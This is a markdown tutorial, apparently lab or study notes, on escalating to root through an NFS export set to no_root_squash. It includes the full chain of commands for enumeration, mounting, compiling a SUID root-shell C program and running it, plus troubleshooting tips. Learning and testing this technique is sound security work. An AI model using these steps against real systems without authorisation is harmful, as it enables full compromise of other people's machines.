# 🛡️ Linux Privilege Escalation: NFS & `no_root_squash` Exploitation

---

## 1. Core Concept: NFS (Network File System)

NFS (Network File System) is a protocol that allows a server to share directories over a network so that client machines can mount and use them like local storage.

---

## Working Model

- Server exports directories
- Client mounts exported directory
- Client interacts with remote files as local files

---

# 2. The Vulnerability: `/etc/exports`

NFS behavior is controlled by:

```bash
/etc/exports
```

---

## Default Security: `root_squash`

By default, NFS protects the server using:

### root_squash behavior:
- Client root user → mapped to `nfsnobody`
- Removes administrative privileges
- Prevents root-level file manipulation

---

## Vulnerable Misconfiguration: `no_root_squash`

If configured like:

```text
no_root_squash
```

### Effect:

- Client root = Server root
- No privilege downgrading
- Full trust granted to remote root user

---

## Exploitation Logic

If `no_root_squash` is enabled:

1. Attacker mounts shared directory
2. Creates malicious executable
3. Applies SUID bit
4. Server treats it as root-owned file
5. Execution leads to root shell

---

# 3. Step-by-Step Exploitation

---

## Step A: Enumeration

```bash
showmount -e <Target_IP>
```

### Output reveals:
- Exported directories
- Example: `/tmp`, `/home`, `/var`

---

## Step B: Mount NFS Share

```bash
mkdir /mnt/tmp
cd ~
mount -o rw,vers=3 <Target_IP>:/tmp /mnt/tmp
```

---

## Flags

- `rw` → read/write access
- `vers=3` → NFS version compatibility

---

## Step C: Payload Creation

```bash
cd /mnt/tmp
nano shell.c
```

---

### C Payload:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

---

## Step D: Compile & Set SUID

```bash
gcc shell.c -o shell
chmod +s shell
```

---

## Step E: Execute on Target Side

On target system:

```bash
cd /tmp
./shell
```

---

## Result

```bash
whoami
root
```

---

# 🛠️ Troubleshooting Sheet

---

## Error 1: Mounted Folder Appears Empty

### Problem
Mount succeeds but no files visible.

---

### Root Cause

Mount executed inside same directory causing stale view.

---

### Fix

```bash
cd ~
umount /mnt/tmp
mount -o rw,vers=3 <IP>:/tmp /mnt/tmp
cd /mnt/tmp
ls -la
```

---

## Error 2: Device Busy / Stale File Handle

### Problem
```text
umount: target is busy
```

---

### Root Cause
- Current shell inside mount directory
- Active process using mount point

---

### Fix

```bash
cd ~
umount /mnt/tmp
```

---

# 🧠 Key Concept Summary

---

## NFS Trust Model

| Setting | Effect |
|--------|--------|
| root_squash | Root downgraded to nfsnobody |
| no_root_squash | Root preserved across network |

---

## Exploitation Chain

1. Find exported directory
2. Mount share locally
3. Create payload
4. Compile binary
5. Set SUID
6. Execute → root shell

---

# ⚡ Security Impact

If `no_root_squash` is enabled:

- Remote root = local root
- Arbitrary file creation possible
- SUID abuse becomes trivial
- Full system compromise possible

---

# 🧠 Final Insight

NFS misconfiguration is dangerous because:

- It trusts network clients too much
- It ignores privilege separation
- It allows local privilege escalation via remote filesystem

---
